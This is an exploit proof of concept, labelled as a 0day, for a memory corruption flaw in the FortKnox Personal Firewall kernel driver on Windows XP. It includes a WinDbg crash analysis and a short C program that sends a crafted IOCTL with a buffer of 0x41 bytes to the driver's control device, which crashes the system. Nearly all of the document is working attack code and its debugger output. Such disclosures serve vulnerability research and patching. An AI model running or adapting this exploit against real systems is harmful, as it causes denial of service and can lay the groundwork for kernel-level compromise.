/*
# Exploit Title: [0day] FortKnox Personal Firewall kernel driver (fortknoxfw.sys) memory corruption vulnerability
# Date: 25/10/2013
# Author: Arash Allebrahim 
# Contact : Genius_s3c_firewall@yahoo.com
# Vendor Homepage: http://www.fortknox-firewall.com/
# Vulnerable software : http://download.cnet.com/FortKnox-Personal-Firewall/3000-10435_4-10542427.html
# Version: 9.0.305.0
# Tested on: Windows XP SP3
*/



/*
kd> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)
An attempt was made to access a pageable (or completely invalid) address at an
interrupt request level (IRQL) that is too high.  This is usually
caused by drivers using improper addresses.
If kernel debugger is available get stack backtrace.
Arguments:
Arg1: 41414141, memory referenced
Arg2: 00000002, IRQL
Arg3: 00000000, value 0 = read operation, 1 = write operation
Arg4: f76e21bd, address which referenced memory

Debugging Details:
------------------

*************************************************************************
***                                                                   ***
***                                                                   ***
***    Your debugger is not using the correct symbols                 ***
***                                                                   ***
***    In order for this command to work properly, your symbol path   ***
***    must point to .pdb files that have full type information.      ***
***                                                                   ***
***    Certain .pdb files (such as the public OS symbols) do not      ***
***    contain the required information.  Contact the group that      ***
***    provided you with these symbols if you need this command to    ***
***    work.                                                          ***
***                                                                   ***
***    Type referenced: kernel32!pNlsUserInfo                         ***
***                                                                   ***
*************************************************************************
*************************************************************************
***                                                                   ***
***                                                                   ***
***    Your debugger is not using the correct symbols                 ***
***                                                                   ***
***    In order for this command to work properly, your symbol path   ***
***    must point to .pdb files that have full type information.      ***
***                                                                   ***
***    Certain .pdb files (such as the public OS symbols) do not      ***
***    contain the required information.  Contact the group that      ***
***    provided you with these symbols if you need this command to    ***
***    work.                                                          ***
***                                                                   ***
***    Type referenced: kernel32!pNlsUserInfo                         ***
***                                                                   ***
*************************************************************************

READ_ADDRESS:  41414141 

CURRENT_IRQL:  2

FAULTING_IP: 
fortknoxfw+51bd
f76e21bd 8a08            mov     cl,byte ptr [eax]

DEFAULT_BUCKET_ID:  DRIVER_FAULT

BUGCHECK_STR:  0xD1

PROCESS_NAME:  3.exe

TRAP_FRAME:  f72f78d4 -- (.trap 0xfffffffff72f78d4)
ErrCode = 00000000
eax=41414141 ebx=86e36a88 ecx=00000000 edx=050a0003 esi=41414142 edi=86e36b20
eip=f76e21bd esp=f72f7948 ebp=f72f7958 iopl=0         nv up ei pl nz na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010206
fortknoxfw+0x51bd:
f76e21bd 8a08            mov     cl,byte ptr [eax]          ds:0023:41414141=??
Resetting default scope

LAST_CONTROL_TRANSFER:  from 804f7bad to 80527c0c

STACK_TEXT:  
f72f7488 804f7bad 00000003 f72f77e4 00000000 nt!RtlpBreakWithStatusInstruction
f72f74d4 804f879a 00000003 41414141 f76e21bd nt!KiBugCheckDebugBreak+0x19
f72f78b4 8054073b 0000000a 41414141 00000002 nt!KeBugCheck2+0x574
f72f78b4 f76e21bd 0000000a 41414141 00000002 nt!KiTrap0E+0x233
WARNING: Stack unwind information not available. Following frames may be wrong.
f72f7958 f76e306c 00000000 86b5f768 869db5e0 fortknoxfw+0x51bd
f72f7970 f76de005 8e86200c 86b5f768 f72f79a0 fortknoxfw+0x606c
f72f7b60 804ee129 86c12af0 869db5e0 00000000 fortknoxfw+0x1005
f72f7b70 f79c630f 86c62320 806d32d0 869db5e0 nt!IopfCallDriver+0x31
f72f7b9c 80574e56 869db650 86c62320 869db5e0 IrpSys+0x130f
f72f7bb0 80575d11 86c12af0 869db5e0 86c62320 nt!IopSynchronousServiceTail+0x70
f72f7c58 8056e57c 000007e8 00000000 00000000 nt!IopXxxControlFile+0x5e7
f72f7c8c f79c81f3 000007e8 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
f72f7d34 8053d6d8 010007e8 00000000 00000000 IrpSys+0x31f3
f72f7d34 7c90e514 010007e8 00000000 00000000 nt!KiFastCallEntry+0xf8
0012fd28 00401126 000007e8 8e86200c 0012fe44 ntdll!KiFastSystemCallRet
0012ff80 00401689 00000001 00430eb0 00430e00 3+0x1126
0012ffc0 7c817077 be1ea176 01ced0f6 7ffdf000 3+0x1689
0012fff0 00000000 004015a0 00000000 78746341 kernel32!BaseProcessStart+0x23


STACK_COMMAND:  kb

FOLLOWUP_IP: 
fortknoxfw+51bd
f76e21bd 8a08            mov     cl,byte ptr [eax]

SYMBOL_STACK_INDEX:  4

SYMBOL_NAME:  fortknoxfw+51bd

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: fortknoxfw

IMAGE_NAME:  fortknoxfw.sys

DEBUG_FLR_IMAGE_TIMESTAMP:  4b0038da

FAILURE_BUCKET_ID:  0xD1_fortknoxfw+51bd

BUCKET_ID:  0xD1_fortknoxfw+51bd

Followup: MachineOwner
 */


#include<stdio.h>
#include<windows.h>
#include<stdlib.h>
int main(int argc, char *argv[])
{
	BOOL res = FALSE;
	HANDLE hDevice = INVALID_HANDLE_VALUE;
	BYTE obuff[0x98];
	ULONG inputBuffer;
	DWORD bts;
	hDevice = CreateFile("\\\\.\\fortknoxfw_ctl",
		GENERIC_READ|GENERIC_WRITE,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL|FILE_FLAG_OVERLAPPED
		,NULL);
	if(hDevice == INVALID_HANDLE_VALUE){
		printf("(-)Failure while File Creation!");
		exit(0);
	}else{
		printf("(+) trying to send the IO Control code to the device ...");
		inputBuffer = 0;
		memset(obuff,0x41,0x98);
		res = DeviceIoControl(hDevice,0x8e86200c,&inputBuffer,0x98,obuff,0x98,&bts,NULL);
		if(res==FALSE)
			printf("Failed while DeviceIoControl");
	}

	return 0;
	
}